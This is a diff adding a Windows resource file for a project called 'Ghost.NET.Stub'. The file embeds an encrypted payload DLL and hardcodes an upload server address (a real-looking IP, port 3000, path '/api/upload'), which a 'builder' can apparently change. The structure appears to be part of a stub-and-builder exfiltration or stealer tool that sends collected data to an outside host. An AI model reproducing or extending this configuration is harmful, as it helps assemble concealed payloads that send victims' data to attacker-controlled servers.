@@ -1,0 +1,26 @@
+// Ghost.NET.Stub.rc
+// Resource file for Ghost.NET.Stub project
+// v0.15.0 (c) Alexander 'xaitax' Hagenah
+
+#include <windows.h>
+
+// Embed the encrypted payload DLL as a resource
+PAYLOAD_DLL RCDATA "PAYLOAD_DLL"
+
+// Server configuration resource - can be modified by builder
+1000 RCDATA
+{
+    "51.38.196.76\0"
+}
+
+// Server port configuration
+1001 RCDATA
+{
+    "3000\0"
+}
+
+// API endpoint path
+1002 RCDATA
+{
+    "/api/upload\0"
+}
